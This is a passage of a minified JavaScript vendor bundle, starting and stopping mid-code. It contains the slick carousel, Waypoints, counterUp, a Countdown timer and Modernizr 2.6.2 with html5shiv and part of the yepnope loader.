                              !1 === o.options.infinite &&
                                  ((0 === o.currentSlide && "right" === i) || (o.currentSlide >= o.getDotCount() && "left" === i)) &&
                                  ((n = o.touchObject.swipeLength * o.options.edgeFriction), (o.touchObject.edgeHit = !0)),
                              !1 === o.options.vertical ? (o.swipeLeft = e + n * s) : (o.swipeLeft = e + n * (o.$list.height() / o.listWidth) * s),
                              !0 === o.options.verticalSwiping && (o.swipeLeft = e + n * s),
                              !0 !== o.options.fade && !1 !== o.options.touchMove && (!0 === o.animating ? ((o.swipeLeft = null), !1) : void o.setCSS(o.swipeLeft)))
                            : void 0)
                );
            }),
            (i.prototype.swipeStart = function (t) {
                var e,
                    i = this;
                if (((i.interrupted = !0), 1 !== i.touchObject.fingerCount || i.slideCount <= i.options.slidesToShow)) return (i.touchObject = {}), !1;
                void 0 !== t.originalEvent && void 0 !== t.originalEvent.touches && (e = t.originalEvent.touches[0]),
                    (i.touchObject.startX = i.touchObject.curX = void 0 !== e ? e.pageX : t.clientX),
                    (i.touchObject.startY = i.touchObject.curY = void 0 !== e ? e.pageY : t.clientY),
                    (i.dragging = !0);
            }),
            (i.prototype.unfilterSlides = i.prototype.slickUnfilter = function () {
                var t = this;
                null !== t.$slidesCache && (t.unload(), t.$slideTrack.children(this.options.slide).detach(), t.$slidesCache.appendTo(t.$slideTrack), t.reinit());
            }),
            (i.prototype.unload = function () {
                var e = this;
                t(".slick-cloned", e.$slider).remove(),
                    e.$dots && e.$dots.remove(),
                    e.$prevArrow && e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.remove(),
                    e.$nextArrow && e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.remove(),
                    e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "");
            }),
            (i.prototype.unslick = function (t) {
                this.$slider.trigger("unslick", [this, t]), this.destroy();
            }),
            (i.prototype.updateArrows = function () {
                var t = this;
                Math.floor(t.options.slidesToShow / 2),
                    !0 === t.options.arrows &&
                        t.slideCount > t.options.slidesToShow &&
                        !t.options.infinite &&
                        (t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
                        t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
                        0 === t.currentSlide
                            ? (t.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"))
                            : t.currentSlide >= t.slideCount - t.options.slidesToShow && !1 === t.options.centerMode
                            ? (t.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"))
                            : t.currentSlide >= t.slideCount - 1 &&
                              !0 === t.options.centerMode &&
                              (t.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")));
            }),
            (i.prototype.updateDots = function () {
                var t = this;
                null !== t.$dots &&
                    (t.$dots.find("li").removeClass("slick-active").attr("aria-hidden", "true"),
                    t.$dots
                        .find("li")
                        .eq(Math.floor(t.currentSlide / t.options.slidesToScroll))
                        .addClass("slick-active")
                        .attr("aria-hidden", "false"));
            }),
            (i.prototype.visibility = function () {
                this.options.autoplay && (document[this.hidden] ? (this.interrupted = !0) : (this.interrupted = !1));
            }),
            (t.fn.slick = function () {
                var t,
                    e,
                    n = this,
                    s = arguments[0],
                    r = Array.prototype.slice.call(arguments, 1),
                    o = n.length;
                for (t = 0; t < o; t++) if (("object" == typeof s || void 0 === s ? (n[t].slick = new i(n[t], s)) : (e = n[t].slick[s].apply(n[t].slick, r)), void 0 !== e)) return e;
                return n;
            });
    }),
    (function () {
        "use strict";
        var t = 0,
            e = {};
        function i(n) {
            if (!n) throw new Error("No options passed to Waypoint constructor");
            if (!n.element) throw new Error("No element option passed to Waypoint constructor");
            if (!n.handler) throw new Error("No handler option passed to Waypoint constructor");
            (this.key = "waypoint-" + t),
                (this.options = i.Adapter.extend({}, i.defaults, n)),
                (this.element = this.options.element),
                (this.adapter = new i.Adapter(this.element)),
                (this.callback = n.handler),
                (this.axis = this.options.horizontal ? "horizontal" : "vertical"),
                (this.enabled = this.options.enabled),
                (this.triggerPoint = null),
                (this.group = i.Group.findOrCreate({ name: this.options.group, axis: this.axis })),
                (this.context = i.Context.findOrCreateByElement(this.options.context)),
                i.offsetAliases[this.options.offset] && (this.options.offset = i.offsetAliases[this.options.offset]),
                this.group.add(this),
                this.context.add(this),
                (e[this.key] = this),
                (t += 1);
        }
        (i.prototype.queueTrigger = function (t) {
            this.group.queueTrigger(this, t);
        }),
            (i.prototype.trigger = function (t) {
                this.enabled && this.callback && this.callback.apply(this, t);
            }),
            (i.prototype.destroy = function () {
                this.context.remove(this), this.group.remove(this), delete e[this.key];
            }),
            (i.prototype.disable = function () {
                return (this.enabled = !1), this;
            }),
            (i.prototype.enable = function () {
                return this.context.refresh(), (this.enabled = !0), this;
            }),
            (i.prototype.next = function () {
                return this.group.next(this);
            }),
            (i.prototype.previous = function () {
                return this.group.previous(this);
            }),
            (i.invokeAll = function (t) {
                var i = [];
                for (var n in e) i.push(e[n]);
                for (var s = 0, r = i.length; s < r; s++) i[s][t]();
            }),
            (i.destroyAll = function () {
                i.invokeAll("destroy");
            }),
            (i.disableAll = function () {
                i.invokeAll("disable");
            }),
            (i.enableAll = function () {
                for (var t in (i.Context.refreshAll(), e)) e[t].enabled = !0;
                return this;
            }),
            (i.refreshAll = function () {
                i.Context.refreshAll();
            }),
            (i.viewportHeight = function () {
                return window.innerHeight || document.documentElement.clientHeight;
            }),
            (i.viewportWidth = function () {
                return document.documentElement.clientWidth;
            }),
            (i.adapters = []),
            (i.defaults = { context: window, continuous: !0, enabled: !0, group: "default", horizontal: !1, offset: 0 }),
            (i.offsetAliases = {
                "bottom-in-view": function () {
                    return this.context.innerHeight() - this.adapter.outerHeight();
                },
                "right-in-view": function () {
                    return this.context.innerWidth() - this.adapter.outerWidth();
                },
            }),
            (window.Waypoint = i);
    })(),
    (function () {
        "use strict";
        function t(t) {
            window.setTimeout(t, 1e3 / 60);
        }
        var e = 0,
            i = {},
            n = window.Waypoint,
            s = window.onload;
        function r(t) {
            (this.element = t),
                (this.Adapter = n.Adapter),
                (this.adapter = new this.Adapter(t)),
                (this.key = "waypoint-context-" + e),
                (this.didScroll = !1),
                (this.didResize = !1),
                (this.oldScroll = { x: this.adapter.scrollLeft(), y: this.adapter.scrollTop() }),
                (this.waypoints = { vertical: {}, horizontal: {} }),
                (t.waypointContextKey = this.key),
                (i[t.waypointContextKey] = this),
                (e += 1),
                n.windowContext || ((n.windowContext = !0), (n.windowContext = new r(window))),
                this.createThrottledScrollHandler(),
                this.createThrottledResizeHandler();
        }
        (r.prototype.add = function (t) {
            var e = t.options.horizontal ? "horizontal" : "vertical";
            (this.waypoints[e][t.key] = t), this.refresh();
        }),
            (r.prototype.checkEmpty = function () {
                var t = this.Adapter.isEmptyObject(this.waypoints.horizontal),
                    e = this.Adapter.isEmptyObject(this.waypoints.vertical),
                    n = this.element == this.element.window;
                t && e && !n && (this.adapter.off(".waypoints"), delete i[this.key]);
            }),
            (r.prototype.createThrottledResizeHandler = function () {
                var t = this;
                function e() {
                    t.handleResize(), (t.didResize = !1);
                }
                this.adapter.on("resize.waypoints", function () {
                    t.didResize || ((t.didResize = !0), n.requestAnimationFrame(e));
                });
            }),
            (r.prototype.createThrottledScrollHandler = function () {
                var t = this;
                function e() {
                    t.handleScroll(), (t.didScroll = !1);
                }
                this.adapter.on("scroll.waypoints", function () {
                    (t.didScroll && !n.isTouch) || ((t.didScroll = !0), n.requestAnimationFrame(e));
                });
            }),
            (r.prototype.handleResize = function () {
                n.Context.refreshAll();
            }),
            (r.prototype.handleScroll = function () {
                var t = {},
                    e = {
                        horizontal: { newScroll: this.adapter.scrollLeft(), oldScroll: this.oldScroll.x, forward: "right", backward: "left" },
                        vertical: { newScroll: this.adapter.scrollTop(), oldScroll: this.oldScroll.y, forward: "down", backward: "up" },
                    };
                for (var i in e) {
                    var n = e[i],
                        s = n.newScroll > n.oldScroll ? n.forward : n.backward;
                    for (var r in this.waypoints[i]) {
                        var o = this.waypoints[i][r];
                        if (null !== o.triggerPoint) {
                            var a = n.oldScroll < o.triggerPoint,
                                l = n.newScroll >= o.triggerPoint;
                            ((a && l) || (!a && !l)) && (o.queueTrigger(s), (t[o.group.id] = o.group));
                        }
                    }
                }
                for (var h in t) t[h].flushTriggers();
                this.oldScroll = { x: e.horizontal.newScroll, y: e.vertical.newScroll };
            }),
            (r.prototype.innerHeight = function () {
                return this.element == this.element.window ? n.viewportHeight() : this.adapter.innerHeight();
            }),
            (r.prototype.remove = function (t) {
                delete this.waypoints[t.axis][t.key], this.checkEmpty();
            }),
            (r.prototype.innerWidth = function () {
                return this.element == this.element.window ? n.viewportWidth() : this.adapter.innerWidth();
            }),
            (r.prototype.destroy = function () {
                var t = [];
                for (var e in this.waypoints) for (var i in this.waypoints[e]) t.push(this.waypoints[e][i]);
                for (var n = 0, s = t.length; n < s; n++) t[n].destroy();
            }),
            (r.prototype.refresh = function () {
                var t,
                    e = this.element == this.element.window,
                    i = e ? void 0 : this.adapter.offset(),
                    s = {};
                for (var r in (this.handleScroll(),
                (t = {
                    horizontal: { contextOffset: e ? 0 : i.left, contextScroll: e ? 0 : this.oldScroll.x, contextDimension: this.innerWidth(), oldScroll: this.oldScroll.x, forward: "right", backward: "left", offsetProp: "left" },
                    vertical: { contextOffset: e ? 0 : i.top, contextScroll: e ? 0 : this.oldScroll.y, contextDimension: this.innerHeight(), oldScroll: this.oldScroll.y, forward: "down", backward: "up", offsetProp: "top" },
                }))) {
                    var o = t[r];
                    for (var a in this.waypoints[r]) {
                        var l,
                            h,
                            u,
                            c,
                            d = this.waypoints[r][a],
                            f = d.options.offset,
                            p = d.triggerPoint,
                            g = 0,
                            v = null == p;
                        d.element !== d.element.window && (g = d.adapter.offset()[o.offsetProp]),
                            "function" == typeof f ? (f = f.apply(d)) : "string" == typeof f && ((f = parseFloat(f)), d.options.offset.indexOf("%") > -1 && (f = Math.ceil((o.contextDimension * f) / 100))),
                            (l = o.contextScroll - o.contextOffset),
                            (d.triggerPoint = Math.floor(g + l - f)),
                            (h = p < o.oldScroll),
                            (u = d.triggerPoint >= o.oldScroll),
                            (c = !h && !u),
                            !v && h && u
                                ? (d.queueTrigger(o.backward), (s[d.group.id] = d.group))
                                : !v && c
                                ? (d.queueTrigger(o.forward), (s[d.group.id] = d.group))
                                : v && o.oldScroll >= d.triggerPoint && (d.queueTrigger(o.forward), (s[d.group.id] = d.group));
                    }
                }
                return (
                    n.requestAnimationFrame(function () {
                        for (var t in s) s[t].flushTriggers();
                    }),
                    this
                );
            }),
            (r.findOrCreateByElement = function (t) {
                return r.findByElement(t) || new r(t);
            }),
            (r.refreshAll = function () {
                for (var t in i) i[t].refresh();
            }),
            (r.findByElement = function (t) {
                return i[t.waypointContextKey];
            }),
            (window.onload = function () {
                s && s(), r.refreshAll();
            }),
            (n.requestAnimationFrame = function (e) {
                (window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || t).call(window, e);
            }),
            (n.Context = r);
    })(),
    (function () {
        "use strict";
        function t(t, e) {
            return t.triggerPoint - e.triggerPoint;
        }
        function e(t, e) {
            return e.triggerPoint - t.triggerPoint;
        }
        var i = { vertical: {}, horizontal: {} },
            n = window.Waypoint;
        function s(t) {
            (this.name = t.name), (this.axis = t.axis), (this.id = this.name + "-" + this.axis), (this.waypoints = []), this.clearTriggerQueues(), (i[this.axis][this.name] = this);
        }
        (s.prototype.add = function (t) {
            this.waypoints.push(t);
        }),
            (s.prototype.clearTriggerQueues = function () {
                this.triggerQueues = { up: [], down: [], left: [], right: [] };
            }),
            (s.prototype.flushTriggers = function () {
                for (var i in this.triggerQueues) {
                    var n = this.triggerQueues[i],
                        s = "up" === i || "left" === i;
                    n.sort(s ? e : t);
                    for (var r = 0, o = n.length; r < o; r += 1) {
                        var a = n[r];
                        (a.options.continuous || r === n.length - 1) && a.trigger([i]);
                    }
                }
                this.clearTriggerQueues();
            }),
            (s.prototype.next = function (e) {
                this.waypoints.sort(t);
                var i = n.Adapter.inArray(e, this.waypoints);
                return i === this.waypoints.length - 1 ? null : this.waypoints[i + 1];
            }),
            (s.prototype.previous = function (e) {
                this.waypoints.sort(t);
                var i = n.Adapter.inArray(e, this.waypoints);
                return i ? this.waypoints[i - 1] : null;
            }),
            (s.prototype.queueTrigger = function (t, e) {
                this.triggerQueues[e].push(t);
            }),
            (s.prototype.remove = function (t) {
                var e = n.Adapter.inArray(t, this.waypoints);
                e > -1 && this.waypoints.splice(e, 1);
            }),
            (s.prototype.first = function () {
                return this.waypoints[0];
            }),
            (s.prototype.last = function () {
                return this.waypoints[this.waypoints.length - 1];
            }),
            (s.findOrCreate = function (t) {
                return i[t.axis][t.name] || new s(t);
            }),
            (n.Group = s);
    })(),
    (function () {
        "use strict";
        var t = window.jQuery,
            e = window.Waypoint;
        function i(e) {
            this.$element = t(e);
        }
        t.each(["innerHeight", "innerWidth", "off", "offset", "on", "outerHeight", "outerWidth", "scrollLeft", "scrollTop"], function (t, e) {
            i.prototype[e] = function () {
                var t = Array.prototype.slice.call(arguments);
                return this.$element[e].apply(this.$element, t);
            };
        }),
            t.each(["extend", "inArray", "isEmptyObject"], function (e, n) {
                i[n] = t[n];
            }),
            e.adapters.push({ name: "jquery", Adapter: i }),
            (e.Adapter = i);
    })(),
    (function () {
        "use strict";
        var t = window.Waypoint;
        function e(e) {
            return function () {
                var i = [],
                    n = arguments[0];
                return (
                    e.isFunction(arguments[0]) && ((n = e.extend({}, arguments[1])).handler = arguments[0]),
                    this.each(function () {
                        var s = e.extend({}, n, { element: this });
                        "string" == typeof s.context && (s.context = e(this).closest(s.context)[0]), i.push(new t(s));
                    }),
                    i
                );
            };
        }
        window.jQuery && (window.jQuery.fn.waypoint = e(window.jQuery)), window.Zepto && (window.Zepto.fn.waypoint = e(window.Zepto));
    })(),
    (function (t) {
        "use strict";
        t.fn.counterUp = function (e) {
            var i,
                n = t.extend({ time: 400, delay: 10, offset: 100, beginAt: 0, formatter: !1, context: "window", callback: function () {} }, e);
            return this.each(function () {
                var e = t(this),
                    s = {
                        time: t(this).data("counterup-time") || n.time,
                        delay: t(this).data("counterup-delay") || n.delay,
                        offset: t(this).data("counterup-offset") || n.offset,
                        beginAt: t(this).data("counterup-beginat") || n.beginAt,
                        context: t(this).data("counterup-context") || n.context,
                    };
                e.waypoint(
                    function (t) {
                        !(function () {
                            var t = [],
                                r = s.time / s.delay,
                                o = e.attr("data-num") ? e.attr("data-num") : e.text(),
                                a = /[0-9]+,[0-9]+/.test(o),
                                l = ((o = o.replace(/,/g, "")).split(".")[1] || []).length;
                            s.beginAt > o && (s.beginAt = o);
                            var h = /[0-9]+:[0-9]+:[0-9]+/.test(o);
                            if (h) {
                                var u = o.split(":"),
                                    c = 1;
                                for (i = 0; u.length > 0; ) (i += c * parseInt(u.pop(), 10)), (c *= 60);
                            }
                            for (var d = r; d >= (s.beginAt / o) * r; d--) {
                                var f = parseFloat((o / r) * d).toFixed(l);
                                if (h) {
                                    f = parseInt((i / r) * d);
                                    var p = parseInt(f / 3600) % 24,
                                        g = parseInt(f / 60) % 60,
                                        v = parseInt(f % 60, 10);
                                    f = (p < 10 ? "0" + p : p) + ":" + (g < 10 ? "0" + g : g) + ":" + (v < 10 ? "0" + v : v);
                                }
                                if (a) for (; /(\d+)(\d{3})/.test(f.toString()); ) f = f.toString().replace(/(\d+)(\d{3})/, "$1,$2");
                                n.formatter && (f = n.formatter.call(this, f)), t.unshift(f);
                            }
                            e.data("counterup-nums", t), e.text(s.beginAt);
                            e.data("counterup-func", function () {
                                e.data("counterup-nums")
                                    ? (e.html(e.data("counterup-nums").shift()),
                                      e.data("counterup-nums").length ? setTimeout(e.data("counterup-func"), s.delay) : (e.data("counterup-nums", null), e.data("counterup-func", null), n.callback.call(this)))
                                    : n.callback.call(this);
                            }),
                                setTimeout(e.data("counterup-func"), s.delay);
                        })(),
                            this.destroy();
                    },
                    { offset: s.offset + "%", context: s.context }
                );
            });
        };
    })(jQuery),
    (function (t) {
        if ("object" == typeof exports && "undefined" != typeof module) module.exports = t();
        else if ("function" == typeof define && define.amd) define([], t);
        else {
            var e;
            "undefined" != typeof window ? (e = window) : "undefined" != typeof global ? (e = global) : "undefined" != typeof self && (e = self), (e.Countdown = t());
        }
    })(function () {
        return (function t(e, i, n) {
            function s(o, a) {
                if (!i[o]) {
                    if (!e[o]) {
                        var l = "function" == typeof require && require;
                        if (!a && l) return l(o, !0);
                        if (r) return r(o, !0);
                        var h = new Error("Cannot find module '" + o + "'");
                        throw ((h.code = "MODULE_NOT_FOUND"), h);
                    }
                    var u = (i[o] = { exports: {} });
                    e[o][0].call(
                        u.exports,
                        function (t) {
                            var i = e[o][1][t];
                            return s(i || t);
                        },
                        u,
                        u.exports,
                        t,
                        e,
                        i,
                        n
                    );
                }
                return i[o].exports;
            }
            for (var r = "function" == typeof require && require, o = 0; o < n.length; o++) s(n[o]);
            return s;
        })(
            {
                1: [
                    function (t, e, i) {
                        var n = {
                            date: "June 7, 2087 15:03:25",
                            refresh: 1e3,
                            offset: 0,
                            onEnd: function () {},
                            render: function (t) {
                                this.el.innerHTML = t.years + " years, " + t.days + " days, " + this.leadingZeros(t.hours) + " hours, " + this.leadingZeros(t.min) + " min and " + this.leadingZeros(t.sec) + " sec";
                            },
                        };
                        e.exports = function (t, e) {
                            (this.el = t),
                                (this.options = {}),
                                (this.interval = !1),
                                (this.mergeOptions = function (t) {
                                    for (var e in n)
                                        n.hasOwnProperty(e) &&
                                            ((this.options[e] = void 0 !== t[e] ? t[e] : n[e]),
                                            "date" === e && "object" != typeof this.options.date && (this.options.date = new Date(this.options.date)),
                                            "function" == typeof this.options[e] && (this.options[e] = this.options[e].bind(this)));
                                    "object" != typeof this.options.date && (this.options.date = new Date(this.options.date));
                                }.bind(this)),
                                this.mergeOptions(e),
                                (this.getDiffDate = function () {
                                    var t = (this.options.date.getTime() - Date.now() + this.options.offset) / 1e3,
                                        e = { years: 0, days: 0, hours: 0, min: 0, sec: 0, millisec: 0 };
                                    return t <= 0
                                        ? (this.interval && (this.stop(), this.options.onEnd()), e)
                                        : (t >= 31557600 && ((e.years = Math.floor(t / 31557600)), (t -= 365.25 * e.years * 86400)),
                                          t >= 86400 && ((e.days = Math.floor(t / 86400)), (t -= 86400 * e.days)),
                                          t >= 3600 && ((e.hours = Math.floor(t / 3600)), (t -= 3600 * e.hours)),
                                          t >= 60 && ((e.min = Math.floor(t / 60)), (t -= 60 * e.min)),
                                          (e.sec = Math.round(t)),
                                          (e.millisec = (t % 1) * 1e3),
                                          e);
                                }.bind(this)),
                                (this.leadingZeros = function (t, e) {
                                    return (e = e || 2), (t = String(t)).length > e ? t : (Array(e + 1).join("0") + t).substr(-e);
                                }),
                                (this.update = function (t) {
                                    return "object" != typeof t && (t = new Date(t)), (this.options.date = t), this.render(), this;
                                }.bind(this)),
                                (this.stop = function () {
                                    return this.interval && (clearInterval(this.interval), (this.interval = !1)), this;
                                }.bind(this)),
                                (this.render = function () {
                                    return this.options.render(this.getDiffDate()), this;
                                }.bind(this)),
                                (this.start = function () {
                                    if (!this.interval) return this.render(), this.options.refresh && (this.interval = setInterval(this.render, this.options.refresh)), this;
                                }.bind(this)),
                                (this.updateOffset = function (t) {
                                    return (this.options.offset = t), this;
                                }.bind(this)),
                                (this.restart = function (t) {
                                    return this.mergeOptions(t), (this.interval = !1), this.start(), this;
                                }.bind(this)),
                                this.start();
                        };
                    },
                    {},
                ],
                2: [
                    function (t, e, i) {
                        var n = t("./countdown.js"),
                            s = "countdown";
                        (jQuery.fn.countdown = function (t) {
                            return $.each(this, function (e, i) {
                                var r = $(i);
                                r.data(s) || (r.data("date") && (t.date = r.data("date")), r.data(s, new n(i, t)));
                            });
                        }),
                            (e.exports = n);
                    },
                    { "./countdown.js": 1 },
                ],
            },
            {},
            [2]
        )(2);
    }),
    (window.Modernizr = (function (t, e, i) {
        function n(t) {
            f.cssText = t;
        }
        function s(t, e) {
            return typeof t === e;
        }
        function r(t, e) {
            for (var n in t) {
                var s = t[n];
                if (!~("" + s).indexOf("-") && f[s] !== i) return "pfx" != e || s;
            }
            return !1;
        }
        function o(t, e, n) {
            var o = t.charAt(0).toUpperCase() + t.slice(1),
                a = (t + " " + v.join(o + " ") + o).split(" ");
            return s(e, "string") || s(e, "undefined")
                ? r(a, e)
                : (function (t, e, n) {
                      for (var r in t) {
                          var o = e[t[r]];
                          if (o !== i) return !1 === n ? t[r] : s(o, "function") ? o.bind(n || e) : o;
                      }
                      return !1;
                  })((a = (t + " " + m.join(o + " ") + o).split(" ")), e, n);
        }
        var a,
            l,
            h = {},
            u = e.documentElement,
            c = "modernizr",
            d = e.createElement(c),
            f = d.style,
            p = " -webkit- -moz- -o- -ms- ".split(" "),
            g = "Webkit Moz O ms",
            v = g.split(" "),
            m = g.toLowerCase().split(" "),
            _ = {},
            y = [],
            w = y.slice,
            x = function (t, i, n, s) {
                var r,
                    o,
                    a,
                    l,
                    h = e.createElement("div"),
                    d = e.body,
                    f = d || e.createElement("body");
                if (parseInt(n, 10)) for (; n--; ) ((a = e.createElement("div")).id = s ? s[n] : c + (n + 1)), h.appendChild(a);
                return (
                    (r = ["&#173;", '<style id="s', c, '">', t, "</style>"].join("")),
                    (h.id = c),
                    ((d ? h : f).innerHTML += r),
                    f.appendChild(h),
                    d || ((f.style.background = ""), (f.style.overflow = "hidden"), (l = u.style.overflow), (u.style.overflow = "hidden"), u.appendChild(f)),
                    (o = i(h, t)),
                    d ? h.parentNode.removeChild(h) : (f.parentNode.removeChild(f), (u.style.overflow = l)),
                    !!o
                );
            },
            b = {}.hasOwnProperty;
        for (var S in ((l =
            s(b, "undefined") || s(b.call, "undefined")
                ? function (t, e) {
                      return e in t && s(t.constructor.prototype[e], "undefined");
                  }
                : function (t, e) {
                      return b.call(t, e);
                  }),
        Function.prototype.bind ||
            (Function.prototype.bind = function (t) {
                var e = this;
                if ("function" != typeof e) throw new TypeError();
                var i = w.call(arguments, 1),
                    n = function () {
                        if (this instanceof n) {
                            var s = function () {};
                            s.prototype = e.prototype;
                            var r = new s(),
                                o = e.apply(r, i.concat(w.call(arguments)));
                            return Object(o) === o ? o : r;
                        }
                        return e.apply(t, i.concat(w.call(arguments)));
                    };
                return n;
            }),
        (_.touch = function () {
            var i;
            return (
                "ontouchstart" in t || (t.DocumentTouch && e instanceof DocumentTouch)
                    ? (i = !0)
                    : x(["@media (", p.join("touch-enabled),("), c, ")", "{#modernizr{top:9px;position:absolute}}"].join(""), function (t) {
                          i = 9 === t.offsetTop;
                      }),
                i
            );
        }),
        (_.cssanimations = function () {
            return o("animationName");
        }),
        (_.csstransitions = function () {
            return o("transition");
        }),
        _))
            l(_, S) && ((a = S.toLowerCase()), (h[a] = _[S]()), y.push((h[a] ? "" : "no-") + a));
        return (
            (h.addTest = function (t, e) {
                if ("object" == typeof t) for (var n in t) l(t, n) && h.addTest(n, t[n]);
                else {
                    if (((t = t.toLowerCase()), h[t] !== i)) return h;
                    (e = "function" == typeof e ? e() : e), (u.className += " " + (e ? "" : "no-") + t), (h[t] = e);
                }
                return h;
            }),
            n(""),
            (d = null),
            (function (t, e) {
                function i() {
                    var t = p.elements;
                    return "string" == typeof t ? t.split(" ") : t;
                }
                function n(t) {
                    var e = f[t[c]];
                    return e || ((e = {}), d++, (t[c] = d), (f[d] = e)), e;
                }
                function s(t, i, s) {
                    return (
                        i || (i = e),
                        a
                            ? i.createElement(t)
                            : (s || (s = n(i)), (r = s.cache[t] ? s.cache[t].cloneNode() : u.test(t) ? (s.cache[t] = s.createElem(t)).cloneNode() : s.createElem(t)).canHaveChildren && !h.test(t) ? s.frag.appendChild(r) : r)
                    );
                    var r;
                }
                function r(t) {
                    t || (t = e);
                    var r,
                        l,
                        h,
                        u,
                        c,
                        d,
                        f = n(t);
                    return (
                        p.shivCSS &&
                            !o &&
                            !f.hasCSS &&
                            (f.hasCSS =
                                ((u = "article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}"),
                                (c = (h = t).createElement("p")),
                                (d = h.getElementsByTagName("head")[0] || h.documentElement),
                                (c.innerHTML = "x<style>" + u + "</style>"),
                                !!d.insertBefore(c.lastChild, d.firstChild))),
                        a ||
                            ((r = t),
                            (l = f).cache || ((l.cache = {}), (l.createElem = r.createElement), (l.createFrag = r.createDocumentFragment), (l.frag = l.createFrag())),
                            (r.createElement = function (t) {
                                return p.shivMethods ? s(t, r, l) : l.createElem(t);
                            }),
                            (r.createDocumentFragment = Function(
                                "h,f",
                                "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" +
                                    i()
                                        .join()
                                        .replace(/\w+/g, function (t) {
                                            return l.createElem(t), l.frag.createElement(t), 'c("' + t + '")';
                                        }) +
                                    ");return n}"
                            )(p, l.frag))),
                        t
                    );
                }
                var o,
                    a,
                    l = t.html5 || {},
                    h = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
                    u = /^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,
                    c = "_html5shiv",
                    d = 0,
                    f = {};
                !(function () {
                    try {
                        var t = e.createElement("a");
                        (t.innerHTML = "<xyz></xyz>"),
                            (o = "hidden" in t),
                            (a =
                                1 == t.childNodes.length ||
                                (function () {
                                    e.createElement("a");
                                    var t = e.createDocumentFragment();
                                    return void 0 === t.cloneNode || void 0 === t.createDocumentFragment || void 0 === t.createElement;
                                })());
                    } catch (t) {
                        (o = !0), (a = !0);
                    }
                })();
                var p = {
                    elements: l.elements || "abbr article aside audio bdi canvas data datalist details figcaption figure footer header hgroup mark meter nav output progress section summary time video",
                    shivCSS: !1 !== l.shivCSS,
                    supportsUnknownElements: a,
                    shivMethods: !1 !== l.shivMethods,
                    type: "default",
                    shivDocument: r,
                    createElement: s,
                    createDocumentFragment: function (t, s) {
                        if ((t || (t = e), a)) return t.createDocumentFragment();
                        for (var r = (s = s || n(t)).frag.cloneNode(), o = 0, l = i(), h = l.length; o < h; o++) r.createElement(l[o]);
                        return r;
                    },
                };
                (t.html5 = p), r(e);
            })(this, e),
            (h._version = "2.6.2"),
            (h._prefixes = p),
            (h._domPrefixes = m),
            (h._cssomPrefixes = v),
            (h.testProp = function (t) {
                return r([t]);
            }),
            (h.testAllProps = o),
            (h.testStyles = x),
            (h.prefixed = function (t, e, i) {
                return e ? o(t, e, i) : o(t, "pfx");
            }),
            (u.className = u.className.replace(/(^|\s)no-js(\s|$)/, "$1$2") + " js " + y.join(" ")),
            h
        );
    })(this, this.document)),
    (function (t, e, i) {
        function n(t) {
            return "[object Function]" == g.call(t);
        }
        function s(t) {
            return "string" == typeof t;
        }
        function r() {}
        function o(t) {
            return !t || "loaded" == t || "complete" == t || "uninitialized" == t;
        }
        function a() {
            var t = v.shift();
            (m = 1),
                t
                    ? t.t
                        ? f(function () {
                              ("c" == t.t ? c.injectCss : c.injectJs)(t.s, 0, t.a, t.x, t.e, 1);
                          }, 0)
                        : (t(), a())
                    : (m = 0);
        }
        function l(t, i, n, r, l) {
            return (
                (m = 0),
                (i = i || "j"),
                s(t)
                    ? (function (t, i, n, s, r, l, h) {
                          function u(e) {
                              if (!g && o(d.readyState) && ((x.r = g = 1), !m && a(), (d.onload = d.onreadystatechange = null), e))
                                  for (var n in ("img" != t &&
                                      f(function () {
                                          w.removeChild(d);
                                      }, 50),
                                  T[i]))
                                      T[i].hasOwnProperty(n) && T[i][n].onload();
                          }
                          h = h || c.errorTimeout;
                          var d = e.createElement(t),
                              g = 0,
                              _ = 0,
                              x = { t: n, s: i, e: r, a: l, x: h };
                          1 === T[i] && ((_ = 1), (T[i] = [])),
                              "object" == t ? (d.data = i) : ((d.src = i), (d.type = t)),
                              (d.width = d.height = "0"),
                              (d.onerror = d.onload = d.onreadystatechange = function () {
                                  u.call(this, _);
                              }),
                              v.splice(s, 0, x),
                              "img" != t && (_ || 2 === T[i] ? (w.insertBefore(d, y ? null : p), f(u, h)) : T[i].push(d));
                      })("c" == i ? b : x, t, i, this.i++, n, r, l)
                    : (v.splice(this.i++, 0, t), 1 == v.length && a()),
                this
            );
        }
        function h() {
            var t = c;
            return (t.loader = { load: l, i: 0 }), t;
        }
        var u,
            c,
            d = e.documentElement,
            f = t.setTimeout,
            p = e.getElementsByTagName("script")[0],
            g = {}.toString,
            v = [],
            m = 0,
            _ = "MozAppearance" in d.style,
            y = _ && !!e.createRange().compareNode,
            w = y ? d : p.parentNode,
            x = ((d = t.opera && "[object Opera]" == g.call(t.opera)), (d = !!e.attachEvent && !d), _ ? "object" : d ? "script" : "img"),
            b = d ? "script" : x,
            S =
                Array.isArray ||
                function (t) {
                    return "[object Array]" == g.call(t);
                },
            C = [],
            T = {},
            k = {
                timeout: function (t, e) {
                    return e.length && (t.timeout = e[0]), t;
                },
            };
        ((c = function (t) {
            function e(t, e, s, r, o) {
                var a = (function (t) {
                        t = t.split("!");
                        var e,
                            i,
                            n,
                            s = C.length,
                            r = t.pop(),
                            o = t.length;
                        for (r = { url: r, origUrl: r, prefixes: t }, i = 0; i < o; i++) (n = t[i].split("=")), (e = k[n.shift()]) && (r = e(r, n));
                        for (i = 0; i < s; i++) r = C[i](r);
                        return r;
                    })(t),
                    l = a.autoCallback;
                a.url.split(".").pop().split("?").shift(),
                    a.bypass ||
                        (e && (e = n(e) ? e : e[t] || e[r] || e[t.split("/").pop().split("?")[0]]),
